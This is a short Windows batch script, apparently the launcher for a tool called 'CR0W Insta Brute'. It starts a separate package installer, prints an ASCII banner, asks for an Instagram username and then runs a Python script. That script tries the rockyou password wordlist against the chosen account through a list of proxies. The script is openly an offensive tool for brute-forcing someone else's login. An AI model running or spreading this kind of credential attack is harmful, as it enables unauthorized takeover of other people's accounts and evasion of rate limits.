@echo off
chcp 65001 >nul
color 4
title CR0W Insta Brute pkg installer
:pkginstall
echo.
echo you might not have the required packages to run Insta Brute
set /p pkginst=would you like us to automatically install the packages for you? y/n :
if %pkginst% == y goto install
if %pkginst% == n goto main
:install
start installer.bat
timeout 15
goto main
:main
title CR0W Instagram Brute Force Tool
cls
echo.
echo ██╗███╗   ██╗███████╗████████╗ █████╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
echo ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
echo ██║██╔██╗ ██║███████╗   ██║   ███████║    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
echo ██║██║╚██╗██║╚════██║   ██║   ██╔══██║    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
echo ██║██║ ╚████║███████║   ██║   ██║  ██║    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
echo ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
echo.
cd Instagram-
timeout 1 >nul
set /p uname=Enter a username to bruteforce :
python3 instagram.py -u %uname% -p rockyou.txt -px proxylist.txt
goto main